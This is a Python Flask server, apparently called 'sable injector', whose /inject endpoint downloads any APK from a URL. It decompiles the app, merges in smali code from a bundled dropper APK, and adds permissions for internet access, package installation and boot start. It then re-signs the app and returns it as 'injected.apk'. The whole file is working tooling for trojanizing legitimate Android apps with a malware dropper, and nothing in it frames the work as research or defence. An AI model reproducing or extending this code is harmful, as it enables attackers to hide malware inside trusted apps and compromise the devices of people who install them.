import os
import subprocess
import shutil
import tempfile
import requests
import zipfile
import traceback
from flask import Flask, request, send_file, jsonify

app = Flask(__name__)
WORK = tempfile.mkdtemp()
KEYSTORE = "keystore.jks"
DROPPER = "dropper_base.apk"

# Agar 500 error aaye toh HTML ki jagah JSON me error bheje
@app.errorhandler(500)
def internal_error(exception):
    return jsonify({"error": f"Internal Server Error: {str(exception)}"}), 500

@app.route("/")
def home():
    return "sable injector alive"

@app.route("/inject", methods=["POST"])
def inject():
    try:
        data = request.json or {}
        file_url = data.get("apk_url")
        if not file_url:
            return jsonify({"error": "apk_url required"}), 400

        target = os.path.join(WORK, "target.apk")
        
        # Download
        response = requests.get(file_url, stream=True, timeout=60)
        if response.status_code != 200:
            return jsonify({"error": f"Download failed: HTTP {response.status_code}"}), 400
        
        with open(target, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)
        
        if not zipfile.is_zipfile(target):
            return jsonify({"error": "Downloaded file is not a valid APK"}), 400

        # Target decompile
        target_dir = os.path.join(WORK, "target_dir")
        shutil.rmtree(target_dir, ignore_errors=True)
        res = subprocess.run(f"apktool d -r -f -o {target_dir} {target}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Apktool target fail: {res.stderr[:200]}"}), 500

        # Dropper decompile
        dropper_dir = os.path.join(WORK, "dropper_dir")
        shutil.rmtree(dropper_dir, ignore_errors=True)
        res = subprocess.run(f"apktool d -f -o {dropper_dir} {DROPPER}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Apktool dropper fail: {res.stderr[:200]}"}), 500

        # Smali copy
        src = os.path.join(dropper_dir, "smali")
        dst = os.path.join(target_dir, "smali")
        if os.path.exists(src):
            shutil.copytree(src, dst, dirs_exist_ok=True)

        # Manifest merge
        manifest_path = os.path.join(target_dir, "AndroidManifest.xml")
        with open(manifest_path) as f:
            t = f.read()
        perms = ["android.permission.INTERNET","android.permission.REQUEST_INSTALL_PACKAGES","android.permission.RECEIVE_BOOT_COMPLETED","android.permission.WAKE_LOCK"]
        insert = "".join(f'<uses-permission android:name="{p}"/>' for p in perms if p not in t)
        if insert:
            t = t.replace("</application>", insert + "</application>")
        with open(manifest_path, "w") as f:
            f.write(t)

        # Build
        unsigned = os.path.join(WORK, "unsigned.apk")
        res = subprocess.run(f"apktool b -f -o {unsigned} {target_dir}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Apktool build fail: {res.stderr[:200]}"}), 500

        # Sign
        aligned = os.path.join(WORK, "aligned.apk")
        signed = os.path.join(WORK, "signed.apk")
        subprocess.run(f"zipalign -f -p 4 {unsigned} {aligned}", shell=True, check=True)
        
        res = subprocess.run(f"apksigner sign --ks {KEYSTORE} --ks-pass pass:sable123 --key-pass pass:sable123 --out {signed} {aligned}", shell=True, capture_output=True, text=True)
        if res.returncode != 0:
            return jsonify({"error": f"Signing failed: {res.stderr[:200]}"}), 500

        return send_file(signed, as_attachment=True, download_name="injected.apk")

    except Exception as e:
        # Traceback print karega taaki log me exact line dikhe
        traceback.print_exc()
        return jsonify({"error": f"Python Error: {str(e)}"}), 500

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 8080)))
